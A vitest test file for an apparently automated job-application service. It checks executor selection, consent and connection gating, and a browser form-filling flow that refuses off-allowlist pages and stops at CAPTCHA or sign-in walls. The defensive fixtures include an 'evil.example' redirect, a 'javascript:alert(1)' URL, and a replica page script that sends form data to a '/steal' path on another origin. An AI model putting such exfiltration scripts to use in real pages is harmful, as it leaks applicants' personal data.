import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import type * as JobEngine from "@applywise/job-engine";
import { getProvider, type ApplicationSupport, type JobProvider, type ProviderEnv, type ProviderJobRef, type SubmissionPayload, type SubmissionResult } from "@applywise/job-engine";
import type { ApplicationQuestion, CanonicalQuestionKey, ProviderAuthMode, ProviderConnectionStatus, ProviderInfo } from "@applywise/types";
import { executorInfo, selectExecutor } from "@/server/services/executors";
import { demoAtsAdapter, findBrowserAdapter, greenhouseAdapter } from "@/server/services/executors/browser/adapters";
import type { BrowserChallenge, BrowserDriver, BrowserField, BrowserFile, BrowserSession, BrowserSessionOptions } from "@/server/services/executors/browser/driver";
import { createBrowserExecutor, runBrowserApplication } from "@/server/services/executors/browser/flow";
import { createPlaywrightDriver } from "@/server/services/executors/browser/playwright-driver";
import { manualExecutor } from "@/server/services/executors/manual";
import { providerApiExecutor } from "@/server/services/executors/provider-api";
import type { ExecutorContext } from "@/server/services/executors/types";

// The question classifier is owned by another workstream: a small deterministic stand-in keeps these tests independent.
const h = vi.hoisted(() => {
  const RULES: [RegExp, string][] = [
    [/first name/i, "first_name"],
    [/last name/i, "last_name"],
    [/full name/i, "full_name"],
    [/e-?mail/i, "email"],
    [/phone|mobile/i, "phone"],
    [/location|city/i, "current_location"],
    [/linkedin/i, "linkedin_url"],
    [/github/i, "github_url"],
    [/portfolio|website/i, "portfolio_url"],
    [/current company|employer/i, "current_company"],
    [/years of experience/i, "total_experience_years"],
    [/notice period/i, "notice_period"],
    [/authori[sz]ed to work|work permit/i, "work_authorization"],
    [/resume|\bcv\b/i, "resume"],
    [/cover letter/i, "cover_letter"],
  ];
  const slug = (q: string) => q.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
  const keyFor = (q: string) => {
    const hit = RULES.find(([re]) => re.test(q));
    // Work-permit questions differ per country: keep them distinct custom keys like the real classifier would.
    if (hit && hit[1] === "work_authorization" && /singapore/i.test(q)) return `custom:${slug(q)}`;
    return hit ? hit[1] : `custom:${slug(q)}`;
  };
  return { keyFor };
});

vi.mock("@applywise/job-engine", async (importOriginal) => {
  const actual = await importOriginal<typeof JobEngine>();
  return {
    ...actual,
    questionKeyFor: (q: string) => h.keyFor(q),
    classifyQuestion: (q: string, opts: { required?: boolean; options?: string[] | null } = {}): ApplicationQuestion => {
      const key = h.keyFor(q);
      const canonicalKey = (key.startsWith("custom:") ? "custom" : key) as CanonicalQuestionKey;
      return { key, canonicalKey, question: q, required: !!opts.required, inputType: "text", options: opts.options ?? null, skill: null, sensitive: canonicalKey === "notice_period", origin: "provider" };
    },
  };
});

const APP_URL = "http://localhost:3000";

function info(id: string, auth: ProviderAuthMode = "none"): ProviderInfo {
  const cap = { status: "AVAILABLE" as const, via: null, note: "" };
  return {
    id,
    label: `Fake ${id}`,
    kind: "ats",
    platforms: ["OTHER"],
    auth,
    capabilities: { DISCOVERY: cap, DETAIL_FETCH: cap, QUESTION_EXTRACTION: cap, AUTO_APPLY: cap, STATUS_TRACKING: cap },
    manualOnly: false,
    externalRequirements: [],
    notes: [],
    demo: false,
  };
}

function provider(id: string, opts: { auth?: ProviderAuthMode; support?: ApplicationSupport | null; submit?: JobProvider["submitApplication"] | null } = {}): JobProvider {
  return {
    id,
    info: () => info(id, opts.auth),
    matchesJob: () => true,
    ...(opts.support === null ? {} : { supportsApplication: () => opts.support ?? { supported: true, channel: "api", reason: null, detail: "" } }),
    ...(opts.submit === null ? {} : { submitApplication: opts.submit ?? (async () => ({ outcome: "SUBMITTED", externalApplicationId: null, confirmation: null })) }),
  };
}

function jobRef(over: Partial<ProviderJobRef> = {}): ProviderJobRef {
  return {
    jobId: "job-1",
    platform: "GREENHOUSE",
    title: "Frontend Engineer",
    company: "Acme Test",
    applyMethod: "CAREER_PAGE",
    applyUrl: `${APP_URL}/demo/ats/greenhouse/acme-frontend`,
    sourceUrl: null,
    sourceExternalId: null,
    hrEmail: null,
    isDemo: true,
    feedProvider: null,
    sourceMetadata: {},
    ...over,
  };
}

function select(
  p: JobProvider,
  over: {
    job?: Partial<ProviderJobRef>;
    env?: ProviderEnv;
    allowEmail?: boolean;
    connection?: ProviderConnectionStatus | null;
    verified?: boolean;
    emailConsent?: boolean;
  } = {},
) {
  return selectExecutor({
    job: jobRef(over.job),
    provider: p,
    env: { APP_URL, ...over.env },
    settings: { allowEmailApplications: over.allowEmail ?? true },
    connection: over.connection ? { status: over.connection } : null,
    userEmailVerified: over.verified ?? true,
    emailSendingConsent: over.emailConsent ?? true,
  });
}

describe("executor selection", () => {
  it("hands providers without application support to the user", () => {
    const none = select(provider("plain", { support: null }));
    expect(none).toMatchObject({ automatic: false, reason: "AUTOMATION_NOT_SUPPORTED", executor: { kind: "MANUAL", id: "manual" } });
    const restricted = select(provider("restricted", { support: { supported: false, channel: "manual", reason: "PROVIDER_RESTRICTION", detail: "The platform forbids automation." } }));
    expect(restricted).toMatchObject({ automatic: false, reason: "PROVIDER_RESTRICTION", detail: "The platform forbids automation." });
  });

  it("uses the provider API when it can submit, and knows which providers deduplicate", () => {
    const acme = select(provider("acme"));
    expect(acme).toMatchObject({ automatic: true, executor: { kind: "API", id: "api:acme", idempotentSubmission: false } });
    expect(select(provider("demo"))).toMatchObject({ automatic: true, executor: { id: "api:demo", idempotentSubmission: true } });
    expect(select(provider("no-api", { submit: null }))).toMatchObject({ automatic: false, reason: "AUTOMATION_NOT_SUPPORTED" });
  });

  it("requires a CONNECTED connection for key/token providers", () => {
    const keyed = provider("keyed", { auth: "api_key" });
    const missing = select(keyed);
    expect(missing).toMatchObject({ automatic: false, reason: "LOGIN_REQUIRED" });
    expect(!missing.automatic && missing.detail).toContain("Connect Fake keyed in Settings -> Job sources");
    expect(select(keyed, { connection: "NEEDS_ATTENTION" })).toMatchObject({ automatic: false, reason: "LOGIN_REQUIRED" });
    expect(select(keyed, { connection: "DISCONNECTED" })).toMatchObject({ automatic: false, reason: "LOGIN_REQUIRED" });
    expect(select(keyed, { connection: "CONNECTED" })).toMatchObject({ automatic: true, executor: { id: "api:keyed" } });
    expect(select(provider("oauth", { auth: "oauth_token" }), { connection: "CONNECTED" })).toMatchObject({ automatic: true });
  });

  it("sends email applications only with the setting, consent, a verified sender and an HR address", () => {
    const email = provider("email_application", { support: { supported: true, channel: "email", reason: null, detail: "" }, submit: null });
    const job = { hrEmail: "hr@acme.test", applyMethod: "EMAIL" as const };
    expect(select(email, { job })).toMatchObject({ automatic: true, executor: { kind: "API", id: "api:email", idempotentSubmission: false } });
    const cases: [Parameters<typeof select>[1], string][] = [
      [{ job, allowEmail: false }, "turn on email applications"],
      [{ job, emailConsent: false }, "email-sending consent"],
      [{ job, verified: false }, "verify your account email"],
      [{ job: { hrEmail: null } }, "no HR email address"],
    ];
    for (const [over, text] of cases) {
      const s = select(email, over);
      expect(s).toMatchObject({ automatic: false, reason: "AUTOMATION_NOT_SUPPORTED" });
      expect(!s.automatic && s.detail).toContain(text);
    }
  });

  it("never sends automatic email applications through a mail server that only captures them (dev outbox)", () => {
    // The real email_application provider: AUTO_APPLY is LIMITED (manual only) without a delivering email provider.
    const real = getProvider("email_application")!;
    const job = { hrEmail: "hr@acme.test", applyMethod: "EMAIL" as const };
    for (const env of [{}, { EMAIL_PROVIDER: "dev" }, { EMAIL_PROVIDER: "resend" }, { EMAIL_PROVIDER: "smtp" }]) {
      const s = select(real, { job, env });
      expect(s).toMatchObject({ automatic: false, reason: "AUTOMATION_NOT_SUPPORTED" });
      expect(!s.automatic && s.detail).toContain("no email provider that delivers mail");
    }
    expect(select(real, { job, env: { EMAIL_PROVIDER: "resend", RESEND_API_KEY: "re_test_key" } })).toMatchObject({ automatic: true, executor: { id: "api:email" } });
    expect(select(real, { job, env: { EMAIL_PROVIDER: "smtp", SMTP_HOST: "smtp.example.test" } })).toMatchObject({ automatic: true, executor: { id: "api:email" } });
  });

  it("uses the browser executor only when the operator enabled it for the provider and an adapter matches", () => {
    const browser = { support: { supported: true, channel: "browser" as const, reason: null, detail: "" }, submit: null };
    const demo = provider("demo", browser);
    const off = select(demo);
    expect(off).toMatchObject({ automatic: false, reason: "AUTOMATION_NOT_SUPPORTED" });
    expect(!off.automatic && off.detail).toBe("Browser automation is disabled on this server");
    const on = { BROWSER_EXECUTOR_ENABLED: "true" };
    expect(select(demo, { env: on })).toMatchObject({ automatic: true, executor: { kind: "BROWSER", id: "browser:demo-ats", idempotentSubmission: false } });
    // The demo adapter only drives this app's own /demo/ats pages.
    expect(select(demo, { env: on, job: { applyUrl: "https://evil.example/demo/ats/x/y" } })).toMatchObject({ automatic: false });
    expect(select(demo, { env: { ...on, BROWSER_EXECUTOR_PROVIDERS: "greenhouse" } })).toMatchObject({ automatic: false });

    // Experimental ATS adapters run only when listed explicitly.
    const gh = provider("greenhouse", browser);
    const ghJob = { applyUrl: "https://job-boards.greenhouse.io/acme/jobs/123" };
    expect(select(gh, { env: on, job: ghJob })).toMatchObject({ automatic: false });
    expect(select(gh, { env: { ...on, BROWSER_EXECUTOR_PROVIDERS: "demo,greenhouse" }, job: ghJob })).toMatchObject({ automatic: true, executor: { id: "browser:greenhouse" } });
    expect(select(gh, { env: { ...on, BROWSER_EXECUTOR_PROVIDERS: "demo,greenhouse" }, job: { applyUrl: "https://jobs.lever.co/acme/1" } })).toMatchObject({ automatic: false });
  });

  it("knows which stored executors can be retried after a crash", () => {
    expect(executorInfo("api:demo")).toEqual({ kind: "API", idempotentSubmission: true });
    expect(executorInfo("api:acme")).toEqual({ kind: "API", idempotentSubmission: false });
    expect(executorInfo("api:email")).toEqual({ kind: "API", idempotentSubmission: false });
    expect(executorInfo("browser:demo-ats")).toEqual({ kind: "BROWSER", idempotentSubmission: false });
    expect(executorInfo("something-else").idempotentSubmission).toBe(false);
  });

  it("matches adapters by host and the demo adapter by this app's origin", () => {
    expect(findBrowserAdapter(`${APP_URL}/demo/ats/lever/x`, "demo", { APP_URL })).toBe(demoAtsAdapter);
    expect(findBrowserAdapter("http://localhost:3001/demo/ats/lever/x", "demo", { APP_URL })).toBeNull();
    expect(findBrowserAdapter("javascript:alert(1)", "demo", { APP_URL })).toBeNull();
    expect(findBrowserAdapter("https://boards.greenhouse.io/acme/jobs/1", "greenhouse", { BROWSER_EXECUTOR_PROVIDERS: "greenhouse" })).toBe(greenhouseAdapter);
    expect(demoAtsAdapter.extractReference("Application received (demo) - reference DEMO-1A2B3C. Demo only")).toBe("DEMO-1A2B3C");
  });
});

// ---------------------------------------------------------------- API + manual executors

const logger = { info: vi.fn(), warn: vi.fn() };

function payload(over: Partial<SubmissionPayload> = {}): SubmissionPayload {
  return {
    idempotencyKey: "user-1:canonical-1",
    job: jobRef(),
    applicant: {
      fullName: "Asha Rao",
      firstName: "Asha",
      lastName: "Rao",
      email: "asha@example.test",
      phone: "+91 90000 00000",
      location: "Bengaluru",
      linkedinUrl: "https://www.linkedin.com/in/asha-test",
      githubUrl: null,
      portfolioUrl: "https://asha.example.test",
      currentCompany: "Clipverse Media",
      currentTitle: "Frontend Engineer",
      yearsOfExperience: 5,
    },
    resume: { fileName: "Asha_Rao_Resume.pdf", mimeType: "application/pdf", content: new Uint8Array([37, 80, 68, 70]) },
    coverLetter: "Dear team, I would like to apply.",
    answers: [
      { key: "notice_period", question: "What is your notice period?", answer: "30 days" },
      { key: "work_authorization", question: "Are you authorised to work in India?", answer: "Yes" },
    ],
    credential: null,
    ...over,
  };
}

function ctx(p: JobProvider, env: ProviderEnv = { APP_URL }): ExecutorContext {
  return { userId: "user-1", applicationId: "app-1", job: jobRef(), provider: p, env, logger };
}

describe("API and manual executors", () => {
  it("passes the payload and the environment to provider.submitApplication", async () => {
    const submit = vi.fn(async (): Promise<SubmissionResult> => ({ outcome: "SUBMITTED", externalApplicationId: "EXT-1", confirmation: "ok" }));
    const p = provider("acme", { submit });
    const executor = providerApiExecutor(p, "Acme");
    const body = payload({ credential: { token: "secret-token" } });
    await expect(executor.execute(body, ctx(p, { APP_URL, FLAG: "1" }))).resolves.toMatchObject({ outcome: "SUBMITTED", externalApplicationId: "EXT-1" });
    expect(submit).toHaveBeenCalledWith(body, expect.objectContaining({ env: expect.objectContaining({ FLAG: "1" }) }));
  });

  it("the manual executor never submits", async () => {
    await expect(manualExecutor.execute(payload(), ctx(provider("x")))).resolves.toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: "AUTOMATION_NOT_SUPPORTED" });
    expect(manualExecutor.kind).toBe("MANUAL");
  });
});

// ---------------------------------------------------------------- browser flow

const DEMO_FIELDS: BrowserField[] = [
  { index: 0, label: "First Name", name: "first_name", type: "text", required: true, options: null },
  { index: 1, label: "Last Name", name: "last_name", type: "text", required: true, options: null },
  { index: 2, label: "Email", name: "email", type: "email", required: true, options: null },
  { index: 3, label: "Phone", name: "phone", type: "text", required: false, options: null },
  { index: 4, label: "Current location", name: "location", type: "text", required: false, options: null },
  { index: 5, label: "LinkedIn Profile", name: "urls[LinkedIn]", type: "text", required: false, options: null },
  { index: 6, label: "GitHub or portfolio URL", name: "urls[Portfolio]", type: "text", required: false, options: null },
  { index: 7, label: "Current company", name: "org", type: "text", required: false, options: null },
  { index: 8, label: "Total years of experience", name: "experience_years", type: "text", required: false, options: null },
  { index: 9, label: "Notice period", name: "notice_period", type: "text", required: false, options: null },
  { index: 10, label: "Resume/CV", name: "resume", type: "file", required: true, options: null },
  { index: 11, label: "Cover letter", name: "cover_letter", type: "textarea", required: false, options: null },
  { index: 12, label: "Are you authorised to work in India?", name: "question_0", type: "select", required: true, options: ["Select...", "Yes", "No"] },
  { index: 13, label: "Anything else you'd like to share?", name: "question_1", type: "textarea", required: false, options: null },
];

class FakeBrowserSession implements BrowserSession {
  readonly visited: string[] = [];
  readonly filled = new Map<number, string>();
  readonly uploaded = new Map<number, BrowserFile>();
  submittedWith: string[] | null = null;
  listed = false;
  closed = false;
  private url = "about:blank";

  constructor(
    private readonly opts: {
      fields?: BrowserField[];
      challenge?: BrowserChallenge | null;
      confirmation?: string | null;
      /** Where the page ends up after goto (an HTTP / script redirect). */
      redirectTo?: string;
      /** A page script navigates here once the first field is filled. */
      navigateOnFill?: string;
      /** The submit leads here. */
      navigateOnSubmit?: string;
    } = {},
  ) {}

  async goto(url: string) {
    this.visited.push(url);
    this.url = this.opts.redirectTo ?? url;
  }
  currentUrl() {
    return this.url;
  }
  async detectChallenge() {
    return this.opts.challenge ?? null;
  }
  async listFields() {
    this.listed = true;
    return this.opts.fields ?? DEMO_FIELDS;
  }
  async fill(index: number, value: string) {
    this.filled.set(index, value);
    if (this.opts.navigateOnFill) this.url = this.opts.navigateOnFill;
  }
  async upload(index: number, file: BrowserFile) {
    this.uploaded.set(index, file);
  }
  async submit(selectors: string[]) {
    this.submittedWith = selectors;
    if (this.opts.navigateOnSubmit) this.url = this.opts.navigateOnSubmit;
  }
  async readConfirmation(patterns: RegExp[]) {
    const text = this.submittedWith ? (this.opts.confirmation ?? null) : null;
    return text && patterns.some((p) => p.test(text)) ? text : null;
  }
  async close() {
    this.closed = true;
  }
}

const run = (session: BrowserSession, body = payload(), dryRun = false) => runBrowserApplication(session, demoAtsAdapter, body, { dryRun, confirmationTimeoutMs: 1_000, env: { APP_URL }, logger });

describe("browser flow", () => {
  it("fills only mapped fields from verified data, uploads the resume, submits and reads the confirmation", async () => {
    const session = new FakeBrowserSession({ confirmation: "Application received (demo) - reference DEMO-7K2P9Q. Demo only - nothing was sent." });
    const result = await run(session);
    expect(result).toEqual({ outcome: "SUBMITTED", externalApplicationId: "DEMO-7K2P9Q", confirmation: "Application received (demo) - reference DEMO-7K2P9Q. Demo only - nothing was sent." });
    expect(session.visited).toEqual([jobRef().applyUrl]);
    expect(Object.fromEntries(session.filled)).toEqual({
      0: "Asha",
      1: "Rao",
      2: "asha@example.test",
      3: "+91 90000 00000",
      4: "Bengaluru",
      5: "https://www.linkedin.com/in/asha-test",
      // "GitHub or portfolio URL": no GitHub on the profile, the portfolio fits the label.
      6: "https://asha.example.test",
      7: "Clipverse Media",
      8: "5",
      9: "30 days",
      11: "Dear team, I would like to apply.",
      12: "Yes",
    });
    // The optional free-text question has no verified answer: left empty, never invented.
    expect(session.filled.has(13)).toBe(false);
    expect(session.uploaded.get(10)?.fileName).toBe("Asha_Rao_Resume.pdf");
    expect(session.submittedWith).toEqual(demoAtsAdapter.submitSelectors);
  });

  it("stops at a CAPTCHA, MFA prompt or sign-in wall without touching the page", async () => {
    for (const challenge of ["CAPTCHA", "MFA", "LOGIN_REQUIRED"] as const) {
      const session = new FakeBrowserSession({ challenge });
      const result = await run(session);
      expect(result).toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: challenge });
      expect(session.listed).toBe(false);
      expect(session.filled.size + session.uploaded.size).toBe(0);
      expect(session.submittedWith).toBeNull();
    }
  });

  it("asks for information when a required field has no verified value (nothing is filled or guessed)", async () => {
    const fields: BrowserField[] = [...DEMO_FIELDS, { index: 14, label: "Do you hold a valid work permit for Singapore?", name: "question_2", type: "select", required: true, options: ["Yes", "No"] }];
    const session = new FakeBrowserSession({ fields });
    const result = await run(session);
    expect(result).toEqual({ outcome: "NEEDS_INFORMATION", questions: [{ question: "Do you hold a valid work permit for Singapore?", required: true }] });
    expect(session.filled.size).toBe(0);
    expect(session.submittedWith).toBeNull();

    // An answer that is not one of the select's options is unknown, not "the closest option".
    const vague = payload({ answers: [{ key: "work_authorization", question: "Are you authorised to work in India?", answer: "Probably" }] });
    const again = await run(new FakeBrowserSession(), vague);
    expect(again).toMatchObject({ outcome: "NEEDS_INFORMATION", questions: [{ question: "Are you authorised to work in India?" }] });

    // No resume available for a required upload.
    await expect(run(new FakeBrowserSession(), payload({ resume: null }))).resolves.toMatchObject({ outcome: "NEEDS_INFORMATION", questions: [{ question: "Resume/CV" }] });
  });

  it("the user's current-location answer wins; a preferred city is never filled in as where they live", async () => {
    // The payload's applicant.location only ever carries the current-location answer; a stale/other value loses to it.
    const answered = payload({ applicant: { ...payload().applicant, location: "Bengaluru" }, answers: [...payload().answers, { key: "current_location", question: "Current location", answer: "Kolkata" }] });
    const session = new FakeBrowserSession({ confirmation: "Application received" });
    await expect(run(session, answered)).resolves.toMatchObject({ outcome: "SUBMITTED" });
    expect(session.filled.get(4)).toBe("Kolkata");

    // No answer and no location: a REQUIRED location field is a question for the user, not a guess.
    const fields = DEMO_FIELDS.map((f) => (f.index === 4 ? { ...f, required: true } : f));
    const unknown = payload({ applicant: { ...payload().applicant, location: null } });
    await expect(run(new FakeBrowserSession({ fields }), unknown)).resolves.toMatchObject({ outcome: "NEEDS_INFORMATION", questions: [{ question: "Current location" }] });
  });

  it("an exact-key answer beats an earlier answer that only shares the canonical key", async () => {
    // Stand-in keys: the India question keeps the canonical key, the Singapore one is its own question.
    const fields: BrowserField[] = [{ index: 0, label: "Do you hold a valid work permit for Singapore?", name: "q", type: "select", required: true, options: ["Yes", "No"] }];
    const body = payload({
      answers: [
        { key: "work_authorization", question: "Are you authorised to work in India?", answer: "Yes" },
        { key: "custom:do-you-hold-a-valid-work-permit-for-singapore", question: "Do you hold a valid work permit for Singapore?", answer: "No" },
      ],
    });
    const session = new FakeBrowserSession({ fields, confirmation: "Application received" });
    await expect(run(session, body)).resolves.toMatchObject({ outcome: "SUBMITTED" });
    expect(session.filled.get(0)).toBe("No");
    // Without the exact answer the unqualified one is never used for it.
    const unqualified = payload({ answers: [{ key: "work_authorization", question: "Are you authorised to work?", answer: "Yes" }] });
    await expect(run(new FakeBrowserSession({ fields }), unqualified)).resolves.toMatchObject({ outcome: "NEEDS_INFORMATION" });
  });

  it("never fills or submits anything once the page has left the adapter's allowlist", async () => {
    // Redirected on arrival (HTTP or script): nothing is listed, filled or submitted.
    const redirected = new FakeBrowserSession({ redirectTo: "https://evil.example/careers?next=1", confirmation: "Application received" });
    await expect(run(redirected)).resolves.toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: "UNSUPPORTED_FLOW", detail: expect.stringContaining("redirected to another site") });
    expect(redirected.listed).toBe(false);
    expect(redirected.filled.size + redirected.uploaded.size).toBe(0);
    expect(redirected.submittedWith).toBeNull();
    // Same origin but outside the demo pages (e.g. an internal path) is off the allowlist too.
    const internal = new FakeBrowserSession({ redirectTo: `${APP_URL}/api/admin` });
    await expect(run(internal)).resolves.toMatchObject({ reason: "UNSUPPORTED_FLOW" });
    expect(internal.filled.size).toBe(0);

    // A page script navigates away while the form is filled: stop before the next value.
    const hijacked = new FakeBrowserSession({ navigateOnFill: "http://10.0.0.5/collect", confirmation: "Application received" });
    await expect(run(hijacked)).resolves.toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: "UNSUPPORTED_FLOW" });
    expect(hijacked.filled.size).toBe(1);
    expect(hijacked.submittedWith).toBeNull();

    // The submit leads to another site: a "confirmation" there proves nothing -> uncertain, the user checks.
    const away = new FakeBrowserSession({ navigateOnSubmit: "https://evil.example/thanks", confirmation: "Application received (demo) - reference DEMO-AAAAAA." });
    await expect(run(away)).resolves.toMatchObject({ outcome: "FAILED", submissionUncertain: true, retryable: false });

    // A stored apply URL off the allowlist is never even opened.
    const stored = new FakeBrowserSession();
    await expect(run(stored, payload({ job: jobRef({ applyUrl: "https://evil.example/demo/ats/x/y" }) }))).resolves.toMatchObject({ reason: "UNSUPPORTED_FLOW" });
    expect(stored.visited).toEqual([]);
  });

  it("dry run fills the form but never submits", async () => {
    const session = new FakeBrowserSession({ confirmation: "Application received" });
    const result = await run(session, payload(), true);
    expect(result).toEqual({ outcome: "MANUAL_ACTION_REQUIRED", reason: "UNSUPPORTED_FLOW", detail: "Dry run: the form was filled but not submitted" });
    expect(session.filled.get(0)).toBe("Asha");
    expect(session.submittedWith).toBeNull();
  });

  it("reports an uncertain submission when no confirmation appears", async () => {
    const result = await run(new FakeBrowserSession({ confirmation: null }));
    expect(result).toMatchObject({ outcome: "FAILED", submissionUncertain: true, retryable: false });
  });

  it("the browser executor closes its session and never claims idempotency", async () => {
    const session = new FakeBrowserSession({ confirmation: "Application received (demo) - reference DEMO-AAAAAA." });
    let sessionOpts: BrowserSessionOptions | null = null;
    const driver: BrowserDriver = {
      newSession: async (o) => {
        sessionOpts = o;
        return session;
      },
    };
    const executor = createBrowserExecutor(demoAtsAdapter, { driver: () => driver });
    expect(executor).toMatchObject({ kind: "BROWSER", id: "browser:demo-ats", idempotentSubmission: false });
    await expect(executor.execute(payload(), ctx(provider("demo")))).resolves.toMatchObject({ outcome: "SUBMITTED", externalApplicationId: "DEMO-AAAAAA" });
    expect(session.closed).toBe(true);
    // The driver blocks main-frame navigations off the adapter's allowlist.
    const allowUrl = (sessionOpts as BrowserSessionOptions | null)?.allowUrl;
    expect(allowUrl?.(new URL(`${APP_URL}/demo/ats/lever/x`))).toBe(true);
    expect(allowUrl?.(new URL("https://evil.example/demo/ats/lever/x"))).toBe(false);
    expect(allowUrl?.(new URL(`${APP_URL}/settings`))).toBe(false);

    const dry = new FakeBrowserSession({ confirmation: "Application received" });
    const dryExecutor = createBrowserExecutor(demoAtsAdapter, { driver: () => ({ newSession: async () => dry }) });
    await expect(dryExecutor.execute(payload(), ctx(provider("demo"), { APP_URL, BROWSER_EXECUTOR_DRY_RUN: "true" }))).resolves.toMatchObject({ reason: "UNSUPPORTED_FLOW" });
    expect(dry.submittedWith).toBeNull();

    const broken = createBrowserExecutor(demoAtsAdapter, { driver: () => ({ newSession: async () => Promise.reject(new Error("no chromium")) }) });
    await expect(broken.execute(payload(), ctx(provider("demo")))).resolves.toMatchObject({ outcome: "FAILED", retryable: true, submissionUncertain: false });
  });
});

// ---------------------------------------------------------------- opt-in smoke test of the real Playwright driver

/** Replica of the demo ATS form (same labels/names), served locally; the page script echoes what it received. */
function replicaPage(variant: string | null, extraRequired: boolean, foreign = ""): string {
  if (variant === "login") {
    return `<!doctype html><html><body><form><label>Email<input name="username" type="email"></label><label>Password<input name="password" type="password"></label><button type="submit">Sign in</button></form></body></html>`;
  }
  const captcha = variant === "captcha" ? `<div class="g-recaptcha" data-sitekey="demo"><label><input type="checkbox" name="demo_captcha"> I'm not a robot (demo)</label></div>` : "";
  const extra = extraRequired ? `<label>Do you hold a valid work permit for Singapore? *<select name="question_1" required><option value="" disabled selected>Select...</option><option>Yes</option><option>No</option></select></label>` : "";
  return `<!doctype html><html><body>
<form data-demo-ats="greenhouse">
<label>First Name *<input name="first_name" required></label>
<label>Last Name *<input name="last_name" required></label>
<label>Email *<input name="email" type="email" required></label>
<label for="phone-field">Phone</label><input id="phone-field" name="phone" placeholder="Mobile number">
<label>Current location<input name="location" placeholder="City"></label>
<label>LinkedIn Profile<input name="urls[LinkedIn]"></label>
<label>GitHub or portfolio URL<input name="urls[Portfolio]"></label>
<label>Current company<input name="org"></label>
<label>Total years of experience<input name="experience_years"></label>
<label>Notice period<input name="notice_period"></label>
<label>Resume/CV *<input name="resume" type="file" required></label>
<label>Cover letter<textarea name="cover_letter"></textarea></label>
<label>Are you authorised to work in India? *<select name="question_0" required><option value="" disabled selected>Select...</option><option value="Yes">Yes</option><option value="No">No</option></select></label>
${extra}${captcha}
<button type="submit">Submit application</button>
</form>
<script>
document.querySelector("form").addEventListener("submit", function (e) {
  e.preventDefault();
  if (${JSON.stringify(variant === "exfiltrate")}) {
    // A hostile page: sends the form to another origin by navigating there.
    window.location.href = ${JSON.stringify(foreign)} + "/steal?first=" + encodeURIComponent(new FormData(e.target).get("first_name"));
    return;
  }
  var d = new FormData(e.target);
  var file = d.get("resume");
  var s = document.createElement("p");
  s.setAttribute("role", "status");
  s.textContent = "Application received (demo) - reference DEMO-SMOKE1 [first=" + d.get("first_name") + ";last=" + d.get("last_name") + ";portfolio=" + d.get("urls[Portfolio]") + ";notice=" + d.get("notice_period") + ";work=" + d.get("question_0") + ";resume=" + (file && file.name) + "]";
  e.target.appendChild(s);
});
</script></body></html>`;
}

describe.runIf(process.env.BROWSER_EXECUTOR_SMOKE === "true")("Playwright driver smoke test (opt-in: BROWSER_EXECUTOR_SMOKE=true)", () => {
  let server: Server;
  let origin = "";
  let foreign = "";
  let base = "";
  const seen: string[] = [];
  beforeAll(async () => {
    server = createServer((req, res) => {
      const url = new URL(req.url ?? "/", "http://127.0.0.1");
      seen.push(`${req.headers.host ?? ""}${url.pathname}`);
      if (url.searchParams.get("variant") === "redirect") {
        // An HTTP redirect from the allowlisted page to another origin (localhost != 127.0.0.1).
        res.writeHead(302, { location: `${foreign}/demo/ats/greenhouse/smoke` });
        res.end();
        return;
      }
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(replicaPage(url.searchParams.get("variant"), url.searchParams.get("extra") === "1", foreign));
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = (server.address() as AddressInfo).port;
    origin = `http://127.0.0.1:${port}`;
    foreign = `http://localhost:${port}`;
    base = `${origin}/demo/ats/greenhouse/smoke`;
  });
  afterAll(() => new Promise<void>((resolve) => server.close(() => resolve())));

  const driver = createPlaywrightDriver({ headless: true, timeoutMs: 20_000 });
  async function smoke(query: string, dryRun = false) {
    // The demo adapter allows this app's own /demo/ats pages: here the local replica server is "the app".
    const env = { APP_URL: origin };
    const session = await driver.newSession({ allowUrl: (u) => demoAtsAdapter.matches(u, env) });
    try {
      return await runBrowserApplication(session, demoAtsAdapter, payload({ job: jobRef({ applyUrl: `${base}${query}` }) }), { dryRun, confirmationTimeoutMs: 5_000, env, logger });
    } finally {
      await session.close();
    }
  }

  it("fills the real form, uploads the resume, submits and reads the confirmation", async () => {
    const result = await smoke("");
    expect(result).toMatchObject({ outcome: "SUBMITTED", externalApplicationId: "DEMO-SMOKE1" });
    const confirmation = result.outcome === "SUBMITTED" ? result.confirmation : "";
    expect(confirmation).toContain("first=Asha;last=Rao;portfolio=https://asha.example.test;notice=30 days;work=Yes;resume=Asha_Rao_Resume.pdf");
  }, 60_000);

  it("detects the CAPTCHA and the sign-in wall and asks for unknown required answers", async () => {
    await expect(smoke("?variant=captcha")).resolves.toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: "CAPTCHA" });
    await expect(smoke("?variant=login")).resolves.toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: "LOGIN_REQUIRED" });
    await expect(smoke("?extra=1")).resolves.toEqual({ outcome: "NEEDS_INFORMATION", questions: [{ question: "Do you hold a valid work permit for Singapore?", required: true }] });
    await expect(smoke("", true)).resolves.toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: "UNSUPPORTED_FLOW" });
  }, 90_000);

  it("stops on a redirect to another origin and blocks a script sending the form elsewhere", async () => {
    await expect(smoke("?variant=redirect")).resolves.toMatchObject({ outcome: "MANUAL_ACTION_REQUIRED", reason: "UNSUPPORTED_FLOW" });
    // The form's own script navigates to another origin with the data: the navigation is blocked before it is sent.
    await expect(smoke("?variant=exfiltrate")).resolves.toMatchObject({ outcome: "FAILED", submissionUncertain: true });
    expect(seen.some((s) => s.includes("/steal"))).toBe(false);
  }, 90_000);
});
